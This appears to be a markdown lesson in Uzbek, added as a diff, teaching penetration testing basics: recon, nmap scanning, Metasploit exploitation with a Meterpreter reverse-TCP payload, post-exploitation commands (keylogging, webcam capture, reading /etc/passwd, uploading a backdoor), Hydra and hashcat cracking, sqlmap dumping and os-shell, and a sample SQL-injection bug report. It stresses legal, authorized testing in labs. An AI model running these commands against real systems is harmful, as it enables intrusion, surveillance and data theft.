@@ -1,0 +1,648 @@
+---
+title: "Penetration Testing asoslari"
+description: "Ethical Hacking va zaifliklarni tekshirish"
+---
+
+## TODO
+- Penetration Testing tushunchasini bilish
+- Bug Bounty dasturlarini o'rganish
+- Xavfsizlik vositalarini ishlatish
+
+## Dars mazmuni
+
+### Penetration Testing nima?
+
+**Penetration Testing** (Pen Testing) - tizimning xavfsizligini tekshirish uchun hujum simulyatsiyasi.
+
+**Maqsad**:
+- Zaifliklarni topish
+- Xavfsizlik darajasini baholash
+- Himoya tavsiyalari berish
+
+**Ethical Hacking** - qonuniy va ruxsat bilan xavfsizlik tekshirish.
+
+### Pen Testing turlari
+
+#### 1. Black Box Testing
+
+**Tushuntirish**: Tizim haqida hech qanday ma'lumot yo'q.
+
+**Xuddi haqiqiy hujumchi kabi**:
+- Faqat tashqi ma'lumotlar
+- Ichki tuzilma noma'lum
+- Eng qiyin tur
+
+#### 2. White Box Testing
+
+**Tushuntirish**: To'liq ma'lumot bor.
+
+**Beriladi**:
+- Source code
+- Arxitektura
+- Login credentials
+- Eng chuqur tekshirish
+
+#### 3. Gray Box Testing
+
+**Tushuntirish**: Qisman ma'lumot.
+
+**Kombinatsiya**:
+- Ba'zi credentials
+- Qisman arxitektura
+- Eng realistik
+
+### Pen Testing bosqichlari
+
+```
+1. Reconnaissance (Razvedka)
+   │
+2. Scanning (Skanerlash)
+   │
+3. Gaining Access (Kirish)
+   │
+4. Maintaining Access (Ushlab turish)
+   │
+5. Covering Tracks (Izlarni yashirish)
+```
+
+### 1. Reconnaissance (Ma'lumot to'plash)
+
+**Passive Reconnaissance** - maqsad bilmasligi kerak:
+
+**WHOIS Lookup**:
+```bash
+whois example.com
+```
+
+**DNS Enumeration**:
+```bash
+nslookup example.com
+dig example.com ANY
+```
+
+**Google Dorking** - maxsus qidiruv:
+```
+site:example.com filetype:pdf
+site:example.com inurl:admin
+site:example.com intitle:"index of"
+intitle:"Index of" password
+filetype:sql intext:password
+```
+
+**Shodan** - internet-connected devices qidirish:
+```
+https://shodan.io
+hostname:example.com
+port:22 country:UZ
+```
+
+**Social Media** - OSINT:
+- LinkedIn (xodimlar)
+- Facebook, Instagram
+- GitHub (kodlar)
+- Job postings (texnologiyalar)
+
+**Active Reconnaissance** - to'g'ridan-to'g'ri:
+
+**Ping Sweep**:
+```bash
+nmap -sn 192.168.1.0/24
+```
+
+**Port Scanning** (keyingi bo'limda)
+
+### 2. Scanning (Skanerlash)
+
+#### Nmap - Network Scanner
+
+**O'rnatish**:
+```bash
+# Ubuntu/Debian
+sudo apt install nmap
+
+# Kali Linux (oldindan o'rnatilgan)
+```
+
+**Asosiy skanlar**:
+
+```bash
+# Oddiy scan
+nmap example.com
+
+# SYN scan (stealth)
+nmap -sS example.com
+
+# Service versiyasi
+nmap -sV example.com
+
+# OS detection
+nmap -O example.com
+
+# Aggressive scan
+nmap -A example.com
+
+# Specific ports
+nmap -p 80,443 example.com
+nmap -p 1-1000 example.com
+nmap -p- example.com  # Barcha portlar
+
+# UDP scan
+nmap -sU example.com
+```
+
+**Useful combinations**:
+
+```bash
+# Web server skanerlash
+nmap -p 80,443,8080 -sV --script http-enum example.com
+
+# Zaifliklarni qidirish
+nmap -sV --script vuln example.com
+
+# Subnet scan
+nmap -sn 192.168.1.0/24
+
+# Fast scan (top 100 ports)
+nmap -F example.com
+```
+
+**Nmap Scripting Engine (NSE)**:
+
+```bash
+# SQL Injection test
+nmap --script http-sql-injection example.com
+
+# XSS test
+nmap --script http-xssed example.com
+
+# Brute force
+nmap --script ssh-brute example.com
+```
+
+#### Vulnerability Scanners
+
+**Nikto** - web server scanner:
+
+```bash
+# O'rnatish
+sudo apt install nikto
+
+# Scan
+nikto -h http://example.com
+nikto -h https://example.com -ssl
+```
+
+**OpenVAS** - Vulnerability Assessment:
+
+```bash
+# O'rnatish (Kali)
+sudo apt install openvas
+sudo gvm-setup
+sudo gvm-start
+
+# Web UI: https://localhost:9392
+```
+
+**Nessus** - professional scanner (commercial):
+
+```
+https://www.tenable.com/products/nessus
+```
+
+### 3. Gaining Access (Kirish olish)
+
+#### Metasploit Framework
+
+**Eng kuchli exploitation framework**.
+
+**O'rnatish** (Kali da oldindan o'rnatilgan):
+
+```bash
+sudo apt install metasploit-framework
+```
+
+**Ishlatish**:
+
+```bash
+# Msfconsole ishga tushirish
+msfconsole
+
+# Exploit qidirish
+msf6 > search wordpress
+
+# Exploit tanlash
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload
+
+# Options ko'rish
+msf6 exploit(...) > show options
+
+# Target sozlash
+msf6 exploit(...) > set RHOSTS 192.168.1.100
+msf6 exploit(...) > set TARGETURI /wordpress
+
+# Payload sozlash
+msf6 exploit(...) > set PAYLOAD php/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.1.50
+
+# Exploit ishga tushirish
+msf6 exploit(...) > exploit
+```
+
+**Meterpreter** - kuchli shell:
+
+```bash
+# Tizim ma'lumoti
+meterpreter > sysinfo
+
+# Screenshotolish
+meterpreter > screenshot
+
+# Webcam
+meterpreter > webcam_snap
+
+# Keylogger
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+
+# Fayllarni yuklab olish
+meterpreter > download /etc/passwd
+meterpreter > upload backdoor.php /var/www/html/
+
+# Shell olish
+meterpreter > shell
+
+# Privilege escalation
+meterpreter > getsystem
+```
+
+#### Brute Force Attacks
+
+**Hydra** - login brute forcing:
+
+```bash
+# O'rnatish
+sudo apt install hydra
+
+# SSH brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+# HTTP Form
+hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# FTP
+hydra -l admin -P passwords.txt ftp://192.168.1.100
+```
+
+**John the Ripper** - password cracking:
+
+```bash
+# O'rnatish
+sudo apt install john
+
+# Password hash cracking
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Specific format
+john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt
+
+# Show cracked
+john --show hashes.txt
+```
+
+**Hashcat** - GPU-accelerated:
+
+```bash
+# MD5
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# SHA-256
+hashcat -m 1400 -a 0 hashes.txt wordlist.txt
+```
+
+#### SQL Injection (SQLMap)
+
+**SQLMap** - avtomatik SQL Injection:
+
+```bash
+# O'rnatish
+sudo apt install sqlmap
+
+# Basic scan
+sqlmap -u "http://example.com/page.php?id=1"
+
+# POST request
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"
+
+# Database enumeration
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+
+# Tables
+sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables
+
+# Dump data
+sqlmap -u "http://example.com/page.php?id=1" -D dbname -T users --dump
+
+# OS Shell
+sqlmap -u "http://example.com/page.php?id=1" --os-shell
+```
+
+#### Web Application Testing
+
+**Burp Suite** - web proxy:
+
+```bash
+# Community Edition bepul
+# Professional - pullik
+
+# Proxy sozlash
+1. Burp Suite ishga tushirish
+2. Proxy tab → Options
+3. Browser proxy: 127.0.0.1:8080
+4. Intercept On
+```
+
+**Burp Suite funksiyalari**:
+- **Proxy** - HTTP/HTTPS traffic intercept
+- **Spider** - website crawling
+- **Scanner** - vulnerability scanning (Pro)
+- **Intruder** - brute force, fuzzing
+- **Repeater** - request manipulation
+- **Decoder** - encoding/decoding
+- **Comparer** - response comparison
+
+**OWASP ZAP** - bepul alternative:
+
+```bash
+# O'rnatish
+sudo apt install zaproxy
+
+# yoki
+https://www.zaproxy.org/download/
+```
+
+### Bug Bounty Programs
+
+**Bug Bounty** - zaiflik topganingiz uchun mukofot.
+
+#### Mashhur platformalar
+
+**1. HackerOne**:
+```
+https://www.hackerone.com
+```
+
+**Kompaniyalar**:
+- Google
+- Facebook
+- Twitter
+- Uber
+- GitHub
+
+**2. Bugcrowd**:
+```
+https://www.bugcrowd.com
+```
+
+**3. Synack**:
+```
+https://www.synack.com
+```
+
+**4. YesWeHack**:
+```
+https://www.yeswehack.com
+```
+
+#### Bug Bounty boshlash
+
+**1. Platformaga ro'yxatdan o'tish**:
+- HackerOne profil yaratish
+- Portfolio qurish
+
+**2. Dasturni tanlash**:
+- Public programs
+- Scope o'qish (qaysi qismlar test qilish mumkin)
+- Forbidden areas (man etilgan)
+
+**3. Recon**:
+- Subdomain enumeration
+- Port scanning
+- Technology stack
+
+**4. Testing**:
+- OWASP Top 10
+- Common vulnerabilities
+- Business logic flaws
+
+**5. Reporting**:
+- **Title**: Qisqa va aniq
+- **Description**: Batafsil
+- **Steps to Reproduce**: Qadam-baqadam
+- **Impact**: Qanday zarar
+- **Proof of Concept**: Screenshot/Video
+- **Remediation**: Tuzatish tavsiyasi
+
+#### Report namunasi
+
+```markdown
+# SQL Injection in Login Form
+
+## Summary
+The login form at https://example.com/login is vulnerable to SQL Injection attack, allowing an attacker to bypass authentication.
+
+## Vulnerability Details
+- **URL**: https://example.com/login
+- **Parameter**: username
+- **Type**: SQL Injection (Error-based)
+- **Severity**: Critical
+
+## Steps to Reproduce
+1. Navigate to https://example.com/login
+2. Enter the following payload in username field:
+   ```
+   admin' OR '1'='1' --
+   ```
+3. Enter any password
+4. Click "Login"
+5. Observe that authentication is bypassed
+
+## Proof of Concept
+[Screenshot showing successful bypass]
+[SQLMap output]
+
+## Impact
+An attacker can:
+- Bypass authentication
+- Access any user account
+- Extract sensitive database information
+- Potentially gain administrative access
+
+## Remediation
+Use prepared statements (parameterized queries):
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+```
+
+## References
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- CWE-89: https://cwe.mitre.org/data/definitions/89.html
+```
+
+### Legal va Ethical Issues
+
+**MUHIM!** Faqat ruxsat bilan test qiling!
+
+#### Qonuniy test qilish
+
+**✅ Ruxsat bor**:
+- Bug Bounty programs
+- Vulnerability Disclosure Programs (VDP)
+- O'z loyihangiz
+- CTF (Capture The Flag) musobaqalari
+- Legal lab environments (DVWA, HackTheBox)
+
+**❌ Ruxsatsiz**:
+- Boshqa odamlarning saytlari
+- Kompaniya tizimi (ruxsatsiz)
+- Hukumat saytlari
+
+#### Safe Testing Environments
+
+**1. DVWA** (Damn Vulnerable Web Application):
+```bash
+# Docker
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+# http://localhost
+```
+
+**2. OWASP WebGoat**:
+```bash
+# Download
+https://github.com/WebGoat/WebGoat/releases
+
+# Run
+java -jar webgoat-server-8.2.2.jar
+```
+
+**3. HackTheBox**:
+```
+https://www.hackthebox.com
+```
+
+**4. TryHackMe**:
+```
+https://tryhackme.com
+```
+
+**5. PentesterLab**:
+```
+https://pentesterlab.com
+```
+
+### Certifications
+
+**Entry Level**:
+- **CEH** (Certified Ethical Hacker)
+- **CompTIA Security+**
+
+**Intermediate**:
+- **OSCP** (Offensive Security Certified Professional)
+- **eJPT** (eLearnSecurity Junior Penetration Tester)
+
+**Advanced**:
+- **OSCE** (Offensive Security Certified Expert)
+- **GPEN** (GIAC Penetration Tester)
+
+## Dars uchun vazifa
+
+1. Nmap o'rnatish:
+   - Virtual Machine (Linux)
+   - nmap o'rnating
+   - localhost scan
+
+2. DVWA o'rnatish:
+   - Docker yoki manual
+   - SQL Injection level (low)
+   - XSS level
+
+3. Burp Suite:
+   - Community Edition
+   - Proxy sozlash
+   - HTTP request intercept
+
+4. Google Dorking:
+   - 10 ta query
+   - Interesting results
+   - Screenshot
+
+## Uyga vazifa
+
+1. **Nmap scan**:
+   - scanme.nmap.org
+   - -sV -sC -O -A
+   - Natijani tahlil qiling
+   - Report yozing
+
+2. **DVWA to'liq test**:
+   - SQL Injection (3 level)
+   - XSS (3 level)
+   - CSRF
+   - File Upload
+   - Har biri uchun writeup
+
+3. Quyidagi savolarga javob bering:
+   - Black Box va White Box farqi?
+   - Ethical Hacking qonuniymi?
+   - Bug Bounty nima?
+   - Nmap -sS nima qiladi?
+
+4. **Reconnaissance**:
+   - Tanlangan website
+   - WHOIS, DNS, Subdomain
+   - Google Dorking
+   - Technology stack
+   - Report
+
+5. **HackerOne**:
+   - Ro'yxatdan o'ting
+   - 5 ta public program ko'ring
+   - Scope tahlil qiling
+   - Report template yarating
+
+6. **SQLMap**:
+   - DVWA SQL Injection
+   - --dbs, --tables, --dump
+   - Screenshot
+   - Writeup
+
+7. **Burp Suite**:
+   - DVWA login form
+   - Intercept request
+   - Modify parameters
+   - Repeat attack
+   - Screenshot
+
+8. **Metasploit**:
+   - Metasploitable 2 o'rnating
+   - msfconsole
+   - Basic exploit
+   - Writeup
+
+9. **CTF yechish**:
+   - PicoCTF yoki TryHackMe
+   - 5 ta challenge
+   - Writeup yozing
+
+10. **Complete Penetration Test Report**:
+    - Target: DVWA yoki test sayt
+    - Bosqichlar:
+      * Executive Summary
+      * Reconnaissance
+      * Scanning
+      * Exploitation
+      * Post-Exploitation
+      * Recommendations
+    - Professional format
+    - Screenshot va PoC lar
